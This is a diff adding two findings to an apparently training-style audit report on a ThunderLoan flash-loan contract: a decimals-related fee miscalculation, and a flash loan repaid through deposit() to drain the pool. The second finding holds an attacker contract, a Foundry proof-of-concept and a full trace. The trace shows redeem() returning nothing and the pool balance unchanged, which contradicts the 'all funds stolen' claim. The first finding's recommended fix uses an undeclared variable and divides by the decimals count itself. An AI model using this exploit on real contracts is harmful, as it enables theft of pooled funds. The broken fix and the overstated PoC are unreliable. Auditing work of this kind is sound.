@@ -110,7 +110,7 @@ mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoan
 
 
 
-## H-02.Incorrect calculation of fees may cause loss of funds
+## H-02.The location where the fee is calculated may lead to loss of funds
 
 ### Summary
 
@@ -342,4 +342,367 @@ function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) rev
     token.safeTransferFrom(msg.sender, address(assetToken), amount);
 }
 ```
+
+
+
+## H-03.Fee's Calculation may be incorrect due to non-standard ERC20 tokens
+
+### Summary
+
+Some ERC20 tokens have a decimal value that is not the default 18;for example,USDT has a decimal value of 6.
+
+This can lead to significant discrepancies in the calculation of fees.
+
+
+
+### Vulnerability Details
+
+The ` getCalculationFee() ` function in both the ` ThunderLoan.sol ` file and ` ThunderLoanUpgraded.sol ` file has this vulnerability.
+
+```solidity
+function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
+    //slither-disable-next-line divide-before-multiply
+    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
+    //slither-disable-next-line divide-before-multiply
+    fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
+}
+```
+
+For example,assume that there are two users,UserA and UserB,both borrowing tokens worth 1 ETH through this flash loan.
+
+However,UserA borrows 1 ETH token,while UserB borrows 5000 USDT(assuming the current exchange rate is 1 ETH = 5000 USDT):
+
+> 1 ETH = 5000 USDT;
+>
+> 1 ETH = 1e18 Wei;
+>
+> 1 USDT = 1e6;
+>
+> 1 USDT = 1e18 / 5000 Wei;
+
+UserA：
+
+* amount = 1e18
+* getPriceInWeth(address(ETH)) = 1e18 Wei
+* valueOfBorrowedToken = (1e18 * 1e18) / 1e18 = 1e18
+* fee = (1e18 * 3e15) / 1e18 = 3e15 = 0.003 ETH
+
+UserB:
+
+* amount = 5000 USDT = 5000 * 1e6
+* getPriceInWeth(address(USDT)) = 1e18 / 5000 Wei
+* valueOfBorrowedToken = (5000 * 1e6 * (1e18 / 5000)) / 1e18 = 1e6
+* fee = (1e6 * 3e15) / 1e18 = 3e3 = 0.000000000000003 ETH
+
+It is evident that the final calculated fees are different. For loans of equal value, the one with a smaller decimal value has an advantage.
+
+
+
+### Impact
+
+This vulnerability can lead to the loss of flash loan's fee.
+
+
+
+### Recommendation
+
+Use the token's decimal to calculate the value of the borrowed token.
+
+```solidity
+function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
+    // uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
+    // fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
+    tokenDecimal = getTokenDecimals(token);
+    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / tokenDecimal;
+    fee = (valueOfBorrowedToken * s_flashLoanFee) / getTokenDecimals(ETH);
+}
+
+function getTokenDecimals(IERC20 token) public view returns (uint256) {
+    return token.decimals();
+}
+```
+
+
+
+## H-04.All funds can be stolen if the flash loan is returned using deposit()
+
+### Summary
+
+Since there are no restrictions on the operations executed in a flash loan, the only check is whether the amount after borrowing is greater than the amount before borrowing.
+
+Therefore, an attacker can use ` deposit() ` instead of ` repay() ` after borrowing to settle the loan.
+
+Because the funds in the AssetToken contract are always increasing, the attacker can then use ` redeem() ` to withdraw all the funds.
+
+
+
+### Vulnerability Details
+
+The ` flashloan() ` function in both the ` ThunderLoan.sol ` file and ` ThunderLoanUpgraded.sol ` file has this vulnerability.
+
+```solidity
+function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external {
+    ...
+    uint256 startingBalance = IERC20(token).balanceOf(address(assetToken));
+    ...
+    receiverAddress.functionCall(
+        abi.encodeWithSignature(
+            "executeOperation(address,uint256,uint256,address,bytes)",
+            address(token),
+            amount,
+            fee,
+            msg.sender,
+            params
+        )
+    );
+    uint256 endingBalance = token.balanceOf(address(assetToken));
+    if (endingBalance < startingBalance + fee) {
+        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
+    }
+    ...
+}
+```
+
+The problem arises precisely from this simple check that the ending balance must be greater than the starting balance.
+
+So the attacker first calls ` flashloan() ` to borrow tokens, and then executes ` deposit() ` with the borrowed tokens in the ` executeOperation() ` function. At this point, the ` endingBalance ` will be greater than the ` startingBalance `. Finally, the attacker can use ` redeem() ` to withdraw all the funds.
+
+
+
+### Proof of Concept
+
+#### Test Case
+
+Attacker's Contract:
+
+```solidity
+contract Exp {
+    address owner;
+    ThunderLoan thunderLoan;
+    uint256 balanceBeforeFlashLoan;
+    uint256 balanceAfterFlashLoan;
+
+    constructor(address addr){
+        owner = msg.sender;
+        thunderLoan = ThunderLoan(addr);
+        balanceBeforeFlashLoan = 0;
+    }
+
+    function executeOperation(
+        IERC20 token,
+        uint256 amount,
+        uint256 fee,
+        address initiator,
+        bytes calldata
+    ) external returns (bool){
+        balanceBeforeFlashLoan = token.balanceOf(address(this));
+        token.approve(address(thunderLoan), amount + fee);
+        thunderLoan.deposit(token, amount + fee);
+        balanceAfterFlashLoan = token.balanceOf(address(this));
+    }
+
+    function getBalanceBeforeFlashLoan() external view returns (uint256) {
+        return balanceBeforeFlashLoan;
+    }
+    function getBalanceAfterFlashLoan() external view returns (uint256) {
+        return balanceAfterFlashLoan;
+    }
+    function sendAssetToken(IERC20 token) public {
+        token.transfer(msg.sender, token.balanceOf(address(this)));
+    }
+}
+```
+
+Test:
+
+```solidity
+function testWithdrawAllFunds() public setAllowedToken hasDeposits {
+    uint256 amountToBorrow = AMOUNT * 10;
+    vm.startPrank(user);
+    Exp exp = new Exp(address(thunderLoan));
+    tokenA.mint(address(exp), AMOUNT);
+    thunderLoan.flashloan(address(exp), tokenA, amountToBorrow, "");
+    exp.sendAssetToken(tokenA);
+    thunderLoan.redeem(tokenA, type(uint256).max);
+    vm.stopPrank();
+    console.log("thunderLoan.Balance:", vm.toString(tokenA.balanceOf(address(thunderLoan.getAssetFromToken(tokenA)))));
+}
+```
+
+#### Output
+
+```bash
+[PASS] testWithdrawAllFunds() (gas: 2763111)
+Logs:
+  thunderLoan.Balance: 1000300000000000000000
+
+Traces:
+  [2862611] ThunderLoanTest::testWithdrawAllFunds()
+    ├─ [7662] ERC1967Proxy::fallback() [staticcall]
+    │   ├─ [2648] ThunderLoan::owner() [delegatecall]
+    │   │   └─ ← [Return] ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   └─ ← [Return] ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    ├─ [0] VM::prank(ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Return] 
+    ├─ [1884002] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], true)
+    │   ├─ [1883482] ThunderLoan::setAllowedToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], true) [delegatecall]
+    │   │   ├─ [3421] ERC20Mock::name() [staticcall]
+    │   │   │   └─ ← [Return] "ERC20Mock"
+    │   │   ├─ [3487] ERC20Mock::symbol() [staticcall]
+    │   │   │   └─ ← [Return] "E20M"
+    │   │   ├─ [1808403] → new AssetToken@0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c
+    │   │   │   └─ ← [Return] 8683 bytes of code
+    │   │   ├─ emit AllowedTokenSet(token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], asset: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], allowed: true)
+    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
+    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
+    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000007B)
+    │   └─ ← [Return] 
+    ├─ [47273] ERC20Mock::mint(0x000000000000000000000000000000000000007B, 1000000000000000000000 [1e21])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000007B, value: 1000000000000000000000 [1e21])
+    │   └─ ← [Stop] 
+    ├─ [25234] ERC20Mock::approve(ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 1000000000000000000000 [1e21])
+    │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000007B, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 1000000000000000000000 [1e21])
+    │   └─ ← [Return] true
+    ├─ [105453] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21])
+    │   ├─ [104936] ThunderLoan::deposit(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21]) [delegatecall]
+    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   ├─ emit Deposit(account: 0x000000000000000000000000000000000000007B, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 1000000000000000000000 [1e21])
+    │   │   ├─ [47373] AssetToken::mint(0x000000000000000000000000000000000000007B, 1000000000000000000000 [1e21])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000007B, value: 1000000000000000000000 [1e21])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [2912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
+    │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   ├─ [3017] AssetToken::updateExchangeRate(3000000000000000000 [3e18])
+    │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1003000000000000000 [1.003e18])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [28711] ERC20Mock::transferFrom(0x000000000000000000000000000000000000007B, AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], 1000000000000000000000 [1e21])
+    │   │   │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000007B, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 0)
+    │   │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000007B, to: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], value: 1000000000000000000000 [1e21])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startPrank(0x00000000000000000000000000000000000001c8)
+    │   └─ ← [Return] 
+    ├─ [477961] → new Exp@0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD
+    │   └─ ← [Return] 2153 bytes of code
+    ├─ [25373] ERC20Mock::mint(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], 10000000000000000000 [1e19])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], value: 10000000000000000000 [1e19])
+    │   └─ ← [Stop] 
+    ├─ [171041] ERC1967Proxy::fallback(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100000000000000000000 [1e20], 0x)
+    │   ├─ [170506] ThunderLoan::flashloan(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100000000000000000000 [1e20], 0x) [delegatecall]
+    │   │   ├─ [874] ERC20Mock::balanceOf(AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   │   ├─ [912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
+    │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   ├─ [3017] AssetToken::updateExchangeRate(300000000000000000 [3e17])
+    │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1003300900000000000 [1.003e18])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ emit FlashLoan(receiverAddress: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 100000000000000000000 [1e20], fee: 300000000000000000 [3e17], params: 0x)
+    │   │   ├─ [6583] AssetToken::transferUnderlyingTo(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], 100000000000000000000 [1e20])
+    │   │   │   ├─ [3819] ERC20Mock::transfer(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], 100000000000000000000 [1e20])
+    │   │   │   │   ├─ emit Transfer(from: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], to: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], value: 100000000000000000000 [1e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [122855] Exp::executeOperation(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100000000000000000000 [1e20], 300000000000000000 [3e17], 0x00000000000000000000000000000000000001c8, 0x)
+    │   │   │   ├─ [874] ERC20Mock::balanceOf(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD]) [staticcall]
+    │   │   │   │   └─ ← [Return] 110000000000000000000 [1.1e20]
+    │   │   │   ├─ [25234] ERC20Mock::approve(ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 100300000000000000000 [1.003e20])
+    │   │   │   │   ├─ emit Approval(owner: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 100300000000000000000 [1.003e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [48653] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100300000000000000000 [1.003e20])
+    │   │   │   │   ├─ [48136] ThunderLoan::deposit(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100300000000000000000 [1.003e20]) [delegatecall]
+    │   │   │   │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1003300900000000000 [1.003e18]
+    │   │   │   │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   │   │   │   ├─ emit Deposit(account: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 100300000000000000000 [1.003e20])
+    │   │   │   │   │   ├─ [25473] AssetToken::mint(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], 99970008997300809757 [9.997e19])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], value: 99970008997300809757 [9.997e19])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
+    │   │   │   │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   │   │   │   ├─ [3017] AssetToken::updateExchangeRate(300900000000000000 [3.009e17])
+    │   │   │   │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1003575355883651952 [1.003e18])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [6811] ERC20Mock::transferFrom(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], 100300000000000000000 [1.003e20])
+    │   │   │   │   │   │   ├─ emit Approval(owner: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], to: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], value: 100300000000000000000 [1.003e20])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─ [874] ERC20Mock::balanceOf(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD]) [staticcall]
+    │   │   │   │   └─ ← [Return] 9700000000000000000 [9.7e18]
+    │   │   │   └─ ← [Return] false
+    │   │   ├─ [874] ERC20Mock::balanceOf(AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]) [staticcall]
+    │   │   │   └─ ← [Return] 1000300000000000000000 [1e21]
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [28599] Exp::sendAssetToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
+    │   ├─ [874] ERC20Mock::balanceOf(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD]) [staticcall]
+    │   │   └─ ← [Return] 9700000000000000000 [9.7e18]
+    │   ├─ [25719] ERC20Mock::transfer(0x00000000000000000000000000000000000001c8, 9700000000000000000 [9.7e18])
+    │   │   ├─ emit Transfer(from: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], to: 0x00000000000000000000000000000000000001c8, value: 9700000000000000000 [9.7e18])
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop] 
+    ├─ [21365] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [20848] ThunderLoan::redeem(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
+    │   │   │   └─ ← [Return] 1003575355883651952 [1.003e18]
+    │   │   ├─ [2852] AssetToken::balanceOf(0x00000000000000000000000000000000000001c8) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   ├─ emit Redeemed(account: 0x00000000000000000000000000000000000001c8, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amountOfAssetToken: 0, amountOfUnderlying: 0)
+    │   │   ├─ [3508] AssetToken::burn(0x00000000000000000000000000000000000001c8, 0)
+    │   │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000001c8, to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [6583] AssetToken::transferUnderlyingTo(0x00000000000000000000000000000000000001c8, 0)
+    │   │   │   ├─ [3819] ERC20Mock::transfer(0x00000000000000000000000000000000000001c8, 0)
+    │   │   │   │   ├─ emit Transfer(from: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], to: 0x00000000000000000000000000000000000001c8, value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return] 
+    ├─ [1712] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   ├─ [1195] ThunderLoan::getAssetFromToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [delegatecall]
+    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
+    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
+    ├─ [874] ERC20Mock::balanceOf(AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]) [staticcall]
+    │   └─ ← [Return] 1000300000000000000000 [1e21]
+    ├─ [0] VM::toString(1000300000000000000000 [1e21]) [staticcall]
+    │   └─ ← [Return] "1000300000000000000000"
+    ├─ [0] console::log("thunderLoan.Balance:", "1000300000000000000000") [staticcall]
+    │   └─ ← [Stop] 
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.87ms (2.10ms CPU time)
+```
+
+
+
+### Impact
+
+All the funds of the AssetContract can be stolen.
+
+
+
+### Recommendation
+
+Add a check in ` deposit() ` to make it impossible to use it in the same block of the flash loan.
+
+For example, registring the block.number in a variable in ` flashloan() ` and checking it in ` deposit() `.
+
 
